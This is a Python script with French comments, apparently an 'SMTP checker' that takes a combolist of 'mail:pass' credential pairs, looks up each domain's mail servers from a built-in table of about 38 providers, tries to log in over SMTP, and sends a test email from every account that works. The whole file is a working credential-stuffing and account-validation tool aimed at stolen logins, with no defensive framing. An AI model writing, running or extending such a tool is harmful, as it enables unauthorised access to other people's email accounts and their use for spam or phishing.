import dns.resolver
import smtplib
import socket
import re
from email.mime.text import MIMEText
import sys

# Liste des ports SMTP courants à tester
SMTP_PORTS = [25, 465, 587, 2525]

# Dictionnaire étendu des services de messagerie avec domaines, serveurs SMTP, ports et motifs MX
EMAIL_SERVICES = {
    'gmail.com': {'smtp': 'smtp.gmail.com', 'ports': [587, 465], 'mx_patterns': ['google.com', 'googlemail.com']},
    'yahoo.com': {'smtp': 'smtp.mail.yahoo.com', 'ports': [587, 465], 'mx_patterns': ['yahoo.com', 'yahoodns.net']},
    'outlook.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['outlook.com', 'hotmail.com', 'live.com']},
    'hotmail.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['outlook.com', 'hotmail.com', 'live.com']},
    'live.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['outlook.com', 'hotmail.com', 'live.com']},
    'aol.com': {'smtp': 'smtp.aol.com', 'ports': [587, 465], 'mx_patterns': ['aol.com']},
    'icloud.com': {'smtp': 'smtp.mail.me.com', 'ports': [587], 'mx_patterns': ['icloud.com', 'me.com']},
    'protonmail.com': {'smtp': 'mail.protonmail.com', 'ports': [587], 'mx_patterns': ['protonmail.com', 'proton.me']},
    'zoho.com': {'smtp': 'smtp.zoho.com', 'ports': [587, 465], 'mx_patterns': ['zoho.com']},
    'gmx.com': {'smtp': 'smtp.gmx.com', 'ports': [587, 465], 'mx_patterns': ['gmx.com']},
    'mail.com': {'smtp': 'smtp.mail.com', 'ports': [587, 465], 'mx_patterns': ['mail.com']},
    'yandex.com': {'smtp': 'smtp.yandex.com', 'ports': [587, 465], 'mx_patterns': ['yandex.com', 'yandex.ru']},
    'qq.com': {'smtp': 'smtp.qq.com', 'ports': [587, 465], 'mx_patterns': ['qq.com']},
    '163.com': {'smtp': 'smtp.163.com', 'ports': [587, 465], 'mx_patterns': ['163.com', 'netease.com']},
    'sina.com': {'smtp': 'smtp.sina.com', 'ports': [587, 465], 'mx_patterns': ['sina.com']},
    'naver.com': {'smtp': 'smtp.naver.com', 'ports': [587], 'mx_patterns': ['naver.com']},
    'seznam.cz': {'smtp': 'smtp.seznam.cz', 'ports': [587], 'mx_patterns': ['seznam.cz']},
    'wp.pl': {'smtp': 'smtp.wp.pl', 'ports': [587, 465], 'mx_patterns': ['wp.pl']},
    'orange.fr': {'smtp': 'smtp.orange.fr', 'ports': [587], 'mx_patterns': ['orange.fr', 'wanadoo.fr']},
    'free.fr': {'smtp': 'smtp.free.fr', 'ports': [587], 'mx_patterns': ['free.fr']},
    'sfr.fr': {'smtp': 'smtp.sfr.fr', 'ports': [587], 'mx_patterns': ['sfr.fr', 'numericable.fr', 'noos.fr']},
    'laposte.net': {'smtp': 'smtp.laposte.net', 'ports': [587, 465], 'mx_patterns': ['laposte.net']},
    'bluewin.ch': {'smtp': 'smtpauth.bluewin.ch', 'ports': [587], 'mx_patterns': ['bluewin.ch', 'swisscom.ch']},
    't-online.de': {'smtp': 'securesmtp.t-online.de', 'ports': [587, 465], 'mx_patterns': ['t-online.de']},
    'web.de': {'smtp': 'smtp.web.de', 'ports': [587, 465], 'mx_patterns': ['web.de']},
    'mail.ru': {'smtp': 'smtp.mail.ru', 'ports': [587, 465], 'mx_patterns': ['mail.ru']},
    'rambler.ru': {'smtp': 'smtp.rambler.ru', 'ports': [587], 'mx_patterns': ['rambler.ru']},
    'rediffmail.com': {'smtp': 'smtp.rediffmail.com', 'ports': [587], 'mx_patterns': ['rediffmail.com']},
    'comcast.net': {'smtp': 'smtp.comcast.net', 'ports': [587], 'mx_patterns': ['comcast.net']},
    'att.net': {'smtp': 'smtp.mail.att.net', 'ports': [587, 465], 'mx_patterns': ['att.net', 'sbcglobal.net']},
    'verizon.net': {'smtp': 'smtp.verizon.net', 'ports': [587, 465], 'mx_patterns': ['verizon.net']},
    'btinternet.com': {'smtp': 'mail.btinternet.com', 'ports': [587], 'mx_patterns': ['btinternet.com', 'bt.com']},
    'sky.com': {'smtp': 'smtp.tools.sky.com', 'ports': [587], 'mx_patterns': ['sky.com']},
    'shaw.ca': {'smtp': 'smtp.shaw.ca', 'ports': [587], 'mx_patterns': ['shaw.ca']},
    'rogers.com': {'smtp': 'smtp.rogers.com', 'ports': [587], 'mx_patterns': ['rogers.com']},
    'telus.net': {'smtp': 'smtp.telus.net', 'ports': [587], 'mx_patterns': ['telus.net']},
    'bell.net': {'smtp': 'smtp.bell.net', 'ports': [587], 'mx_patterns': ['bell.net', 'sympatico.ca']},
    'dbmail.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['dbmail.com', 'hotmail.com']},
}

def get_mx_records(domain):
    """Récupère les enregistrements MX pour un domaine."""
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_records = [str(rdata.exchange).rstrip('.') for rdata in answers]
        return mx_records
    except Exception as e:
        return [f"Erreur MX: {str(e)}"]

def guess_smtp_server(domain, mx_records):
    """Devine le serveur SMTP basé sur le domaine et les enregistrements MX."""
    domain = domain.lower()
    
    # Vérifie si le domaine correspond à un service connu
    for known_domain, info in EMAIL_SERVICES.items():
        if domain.endswith(known_domain):
            return info['smtp'], info['ports']
    
    # Vérifie les enregistrements MX pour une correspondance avec les motifs
    for mx in mx_records:
        if mx.startswith("Erreur"):
            continue
        for known_domain, info in EMAIL_SERVICES.items():
            for pattern in info['mx_patterns']:
                if pattern in mx.lower():
                    return info['smtp'], info['ports']
    
    # Fallback : utiliser le premier MX comme serveur SMTP si aucune correspondance
    if mx_records and not mx_records[0].startswith("Erreur"):
        return mx_records[0], SMTP_PORTS
    return None, SMTP_PORTS

def test_smtp_connection(smtp_server, port, email, password):
    """Teste la connexion SMTP avec les identifiants fournis."""
    try:
        if port == 465:
            server = smtplib.SMTP_SSL(smtp_server, port, timeout=10)
        else:
            server = smtplib.SMTP(smtp_server, port, timeout=10)
            server.starttls()
        server.login(email, password)
        server.quit()
        return True, "Connexion SMTP réussie"
    except Exception as e:
        return False, f"Échec connexion: {str(e)}"

def send_test_email(smtp_server, port, email, password, recipient):
    """Envoie un email de test à l'adresse spécifiée."""
    try:
        msg = MIMEText("Ceci est un email de test envoyé par le script SMTP checker amélioré.")
        msg['Subject'] = "Test Email"
        msg['From'] = email
        msg['To'] = recipient

        if port == 465:
            server = smtplib.SMTP_SSL(smtp_server, port, timeout=10)
        else:
            server = smtplib.SMTP(smtp_server, port, timeout=10)
            server.starttls()
        server.login(email, password)
        server.sendmail(email, recipient, msg.as_string())
        server.quit()
        return True, "Email de test envoyé avec succès"
    except Exception as e:
        return False, f"Échec envoi email: {str(e)}"

def is_valid_email(email):
    """Vérifie si l'email est valide (syntaxe de base)."""
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(email_regex, email) is not None

def process_combolist(file_path, test_recipient):
    """Traite la combolist et effectue les vérifications SMTP."""
    results = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line or ':' not in line:
                    continue

                email, password = line.split(':', 1)
                if not is_valid_email(email):
                    results.append(f"{email}: Email invalide")
                    continue

                domain = email.split('@')[1].lower()
                mx_records = get_mx_records(domain)
                smtp_server, ports = guess_smtp_server(domain, mx_records)

                if not smtp_server:
                    results.append(f"{email}: Aucun serveur SMTP trouvé")
                    continue

                result = f"{email}: MX={mx_records}, SMTP={smtp_server}, Ports={ports}"
                for port in ports:
                    success, message = test_smtp_connection(smtp_server, port, email, password)
                    result += f"\n  Port {port}: {message}"
                    if success:
                        # Test d'envoi d'email uniquement si la connexion est réussie
                        send_success, send_message = send_test_email(smtp_server, port, email, password, test_recipient)
                        result += f"\n  Envoi test à {test_recipient}: {send_message}"
                        break  # Sortir après la première connexion réussie

                results.append(result)

    except FileNotFoundError:
        results.append("Erreur: Fichier combolist introuvable")
    except Exception as e:
        results.append(f"Erreur générale: {str(e)}")

    return results

def main():
    # Demander le chemin du fichier combolist
    file_path = input("Entrez le chemin du fichier combolist (mail:pass): ")
    # Demander l'adresse email de test
    test_recipient = input("Entrez l'adresse email pour l'envoi de test: ")

    if not is_valid_email(test_recipient):
        print("Erreur: Adresse email de test invalide")
        return

    # Traiter la combolist
    results = process_combolist(file_path, test_recipient)

    # Afficher les résultats
    for result in results:
        print(result)
        print("-" * 50)

    # Sauvegarder les résultats dans un fichier
    with open('smtp_check_results.txt', 'w', encoding='utf-8') as f:
        for result in results:
            f.write(result + "\n" + "-" * 50 + "\n")

if __name__ == "__main__":
    main()